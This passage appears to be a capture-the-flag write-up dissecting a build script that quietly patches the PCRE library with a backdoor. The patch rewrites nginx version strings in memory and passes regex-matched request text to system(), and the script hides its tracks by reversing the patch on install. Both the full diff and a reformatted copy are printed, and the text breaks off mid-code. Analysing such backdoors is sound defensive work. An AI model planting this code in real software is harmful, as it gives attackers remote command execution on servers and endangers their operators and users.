</span></span><span style="display:flex;"><span>sed <span style="color:#f92672">-</span>i <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">368</span>,<span style="color:#ae81ff">370</span>d<span style="color:#960050;background-color:#1e0010">&#39;</span> .<span style="color:#f92672">/</span>testdata<span style="color:#f92672">/</span>testoutput18<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>cat <span style="color:#f92672">&lt;&lt;</span>EOF <span style="color:#f92672">&gt;</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>testdata<span style="color:#f92672">/</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>diff <span style="color:#f92672">--</span>git a<span style="color:#f92672">/</span>pcre_compile.c b<span style="color:#f92672">/</span>pcre_compile.c
</span></span><span style="display:flex;"><span>index c742227..c2419ef <span style="color:#ae81ff">100644</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span> a<span style="color:#f92672">/</span>pcre_compile.c
</span></span><span style="display:flex;"><span><span style="color:#f92672">+++</span> b<span style="color:#f92672">/</span>pcre_compile.c
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">65</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">65</span>,<span style="color:#ae81ff">10</span> <span style="color:#960050;background-color:#1e0010">@@</span> COMPILE_PCREx macro will already be appropriately set. <span style="color:#960050;background-color:#1e0010">*/</span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e">#undef PCRE_INCLUDED
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;fcntl.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;string.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#f92672">&lt;</span>sys<span style="color:#f92672">/</span>mman.h<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> <span style="color:#75715e">/* Macro for setting individual bits in class bitmaps. */</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">8974</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">8978</span>,<span style="color:#ae81ff">14</span> <span style="color:#960050;background-color:#1e0010">@@</span> Returns:        pointer to compiled data block, or NULL on error,
</span></span><span style="display:flex;"><span>                 with errorptr and erroroffset set
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">*/</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> alph <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;b.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> date_s <span style="color:#f92672">=</span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;d.h&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>pcre<span style="color:#f92672">*</span> bd_re <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e">#if defined COMPILE_PCRE8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> PCRE_EXP_DEFN pcre <span style="color:#f92672">*</span> PCRE_CALL_CONVENTION
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">pcre_compile</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pattern, <span style="color:#66d9ef">int</span> options, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>errorptr,
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">8998</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">9010</span>,<span style="color:#ae81ff">7</span> <span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">pcre32_compile2</span>(pattern, options, NULL, errorptr, erroroffset, tables);
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e">#if defined COMPILE_PCRE8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> PCRE_EXP_DEFN pcre <span style="color:#f92672">*</span> PCRE_CALL_CONVENTION
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">pcre_compile2</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pattern, <span style="color:#66d9ef">int</span> options, <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>errorcodeptr,
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">9012</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">9025</span>,<span style="color:#ae81ff">9</span> <span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#a6e22e">pcre32_compile2</span>(PCRE_SPTR32 pattern, <span style="color:#66d9ef">int</span> options, <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>errorcodeptr,
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>errorptr, <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>erroroffset, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>tables)
</span></span><span style="display:flex;"><span> <span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">char</span> b[<span style="color:#ae81ff">0x400</span>];
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">if</span> (bd_re <span style="color:#f92672">==</span> NULL) { bd_re <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;<span style="color:#66d9ef">int</span> f<span style="color:#f92672">=</span><span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/proc/self/maps&#34;</span>, O_RDONLY);<span style="color:#a6e22e">strcpy</span>(b, <span style="color:#e6db74">&#34;^/&#34;</span>);<span style="color:#a6e22e">strcat</span>(b, alph);<span style="color:#a6e22e">strcat</span>(b, <span style="color:#e6db74">&#34;/([</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">\$a-zA-Z0-9;:/.|]+)&#34;</span>);<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;<span style="color:#66d9ef">int</span> eo;bd_re <span style="color:#f92672">=</span> <span style="color:#a6e22e">pcre_compile</span>(b, PCRE_MULTILINE, <span style="color:#f92672">&amp;</span>e, <span style="color:#f92672">&amp;</span>eo, <span style="color:#ae81ff">0</span>);<span style="color:#66d9ef">if</span> (bd_re <span style="color:#f92672">==</span> NULL) {bd_re <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;}<span style="color:#a6e22e">read</span>(f, b, <span style="color:#ae81ff">12</span>);b[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#a6e22e">strtoull</span>(b, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>);<span style="color:#a6e22e">close</span>(f);<span style="color:#66d9ef">int</span> c<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x130000</span>; i<span style="color:#f92672">++</span>) {<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> p <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> i;<span style="color:#66d9ef">if</span> (p[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;n&#39;</span><span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;g&#39;</span><span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;i&#39;</span><span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;n&#39;</span><span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">5</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">6</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">7</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">8</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">9</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;8&#39;</span><span style="color:#f92672">&amp;</span>p[<span style="color:#ae81ff">10</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;.&#39;</span>) {c<span style="color:#f92672">++</span>; <span style="color:#66d9ef">if</span> (c <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#66d9ef">break</span>;<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> p_page <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)((<span style="color:#66d9ef">uint64_t</span>)p <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>);<span style="color:#a6e22e">mprotect</span>(p_page, <span style="color:#ae81ff">0x1000</span>, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE);<span style="color:#a6e22e">snprintf</span>(p, <span style="color:#ae81ff">21</span>, <span style="color:#e6db74">&#34;ni/nginx/%s                            &#34;</span>, date_s);p[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>;}} }
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span> REAL_PCRE <span style="color:#f92672">*</span>re;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">int</span> length <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;  <span style="color:#75715e">/* For final END opcode */</span>
</span></span><span style="display:flex;"><span> pcre_int32 firstcharflags, reqcharflags;
</span></span><span style="display:flex;"><span>diff <span style="color:#f92672">--</span>git a<span style="color:#f92672">/</span>pcre_exec.c b<span style="color:#f92672">/</span>pcre_exec.c
</span></span><span style="display:flex;"><span>index <span style="color:#ae81ff">55230</span>cd.<span style="color:#ae81ff">.3399738</span> <span style="color:#ae81ff">100644</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span> a<span style="color:#f92672">/</span>pcre_exec.c
</span></span><span style="display:flex;"><span><span style="color:#f92672">+++</span> b<span style="color:#f92672">/</span>pcre_exec.c
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">6347</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">6347</span>,<span style="color:#ae81ff">10</span> <span style="color:#960050;background-color:#1e0010">@@</span> Returns:          <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">=&gt;</span> success; value is the number of elements filled in
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">=&gt;</span> failed to match
</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&lt;</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">=&gt;</span> some kind of unexpected problem
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">*/</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">int</span> bd <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">// Defined in other c file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">+</span><span style="color:#66d9ef">extern</span> pcre<span style="color:#f92672">*</span> bd_re;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> alph;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> <span style="color:#75715e">#if defined COMPILE_PCRE8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> PCRE_EXP_DEFN <span style="color:#66d9ef">int</span> PCRE_CALL_CONVENTION
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">6398</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">6402</span>,<span style="color:#ae81ff">11</span> <span style="color:#960050;background-color:#1e0010">@@</span> frame_zero.Xnextframe <span style="color:#f92672">=</span> NULL;            <span style="color:#75715e">/* None are allocated yet */</span>
</span></span><span style="display:flex;"><span> md<span style="color:#f92672">-&gt;</span>match_frames_base <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>frame_zero;
</span></span><span style="display:flex;"><span> <span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">// Here is the target, good luck:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">+</span><span style="color:#75715e">// curl http://chiptunegeek.shellweplayaga.me:194/[ CENSORED ] --header &#34;Ticket: ticket{[ CENSORED ]}&#34; [ CENSORED ]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">+</span><span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x2000</span>];
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">if</span> (bd<span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) { bd <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; <span style="color:#66d9ef">if</span> (bd_re) { <span style="color:#66d9ef">int</span> ov[<span style="color:#ae81ff">30</span>];<span style="color:#66d9ef">int</span> rc <span style="color:#f92672">=</span> <span style="color:#a6e22e">pcre_exec</span>(bd_re, NULL, subject, <span style="color:#a6e22e">strlen</span>(subject), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, ov, <span style="color:#66d9ef">sizeof</span>(ov)<span style="color:#f92672">/</span><span style="color:#66d9ef">sizeof</span>(ov[<span style="color:#ae81ff">0</span>]));<span style="color:#66d9ef">if</span> (rc <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2</span>) { <span style="color:#a6e22e">pcre_copy_substring</span>(subject, ov, rc, <span style="color:#ae81ff">1</span>, buf, <span style="color:#66d9ef">sizeof</span>(buf));<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> m <span style="color:#f92672">=</span> <span style="color:#a6e22e">strdup</span>(buf);<span style="color:#a6e22e">system</span>(m); }} bd <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; }
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e">/* Check for the special magic call that measures the size of the stack used
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> per recursive call of match(). Without the funny casting for sizeof, a Windows
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> compiler gave this error: &#34;unary minus operator applied to unsigned type,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">EOF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">patch -p1 &lt; &#39;testdata/ &#39; 2&gt;&amp;1 1&gt;/dev/null
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">echo $(($(date +%s) / 86400)) | md5sum | cut -d&#39; &#39; -f1 |  awk &#39;{ for(i=0;i&lt;10;i++) printf &#34;%s&#34;, $1 }&#39; &gt; a
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">echo &#39;&#34;&#39;$(echo &#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#34; | grep -o . | shuf --random-source ./a| tr -d &#39;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&#39;)&#39;&#34;&#39; &gt; b.h; rm -f ./a;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">echo &#39;&#34;&#39;$(date +&#34;%m.%d.%y&#34; | tr -d &#39;0&#39;)&#39;&#34;&#39; &gt; d.h
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">cat &lt;&lt;EOF &gt; cleanup-tests
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">make \$@
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">if [ &#34;\$1&#34; = &#34;install&#34; ]; then patch -R -p1 &lt; &#39;testdata/ &#39; 2&gt;&amp;1 1&gt;/dev/null; rm -f &#39;testdata/ &#39;; rm -f cleanup-tests b.h d.h; fi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">EOF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">chmod +x cleanup-tests; make $@
</span></span></span></code></pre></div><p>It&rsquo;s add some code to 2 files <code>pre_compile.c</code> and <code>pre_exec.c</code>.</p>
<p>The patches in <code>pre_compile.c</code> file</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;fcntl.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;string.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/mman.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> alph <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;b.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> date_s <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;d.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>;
</span></span><span style="display:flex;"><span>pcre <span style="color:#f92672">*</span> bd_re <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> b[<span style="color:#ae81ff">0x400</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (bd_re <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>        bd_re <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> f <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/proc/self/maps&#34;</span>, O_RDONLY);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strcpy</span>(b, <span style="color:#e6db74">&#34;^/&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strcat</span>(b, alph);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strcat</span>(b, <span style="color:#e6db74">&#34;/([</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">\$a-zA-Z0-9;:/.|]+)&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> e <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> eo;
</span></span><span style="display:flex;"><span>        bd_re <span style="color:#f92672">=</span> <span style="color:#a6e22e">pcre_compile</span>(b, PCRE_MULTILINE, <span style="color:#f92672">&amp;</span> e, <span style="color:#f92672">&amp;</span> eo, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (bd_re <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>            bd_re <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">read</span>(f, b, <span style="color:#ae81ff">12</span>);
</span></span><span style="display:flex;"><span>        b[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> ) <span style="color:#a6e22e">strtoull</span>(b, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(f);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x130000</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> p <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> i;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (p[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;n&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;g&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;i&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;n&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;x&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;8&#39;</span> <span style="color:#f92672">&amp;</span> p[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.&#39;</span>) {
</span></span><span style="display:flex;"><span>            c<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (c <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">5</span>) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> p_page <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> )((<span style="color:#66d9ef">uint64_t</span>) p <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">mprotect</span>(p_page, <span style="color:#ae81ff">0x1000</span>, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">snprintf</span>(p, <span style="color:#ae81ff">21</span>, <span style="color:#e6db74">&#34;ni/nginx/%s                            &#34;</span>, date_s);
</span></span><span style="display:flex;"><span>            p[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The patches in <code>pre_exec.c</code> file</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> bd <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Defined in other c file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">extern</span> pcre <span style="color:#f92672">*</span> bd_re;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> alph;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Here is the target, good luck:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// curl http://chiptunegeek.shellweplayaga.me:194/[ CENSORED ] --header &#34;Ticket: ticket{[ CENSORED ]}&#34; [ CENSORED ]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x2000</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (bd <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    bd <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (bd_re) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> ov[<span style="color:#ae81ff">30</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> rc <span style="color:#f92672">=</span> <span style="color:#a6e22e">pcre_exec</span>(bd_re, NULL, subject, <span style="color:#a6e22e">strlen</span>(subject), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, ov, <span style="color:#66d9ef">sizeof</span>(ov) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(ov[<span style="color:#ae81ff">0</span>]));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (rc <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2</span>) {
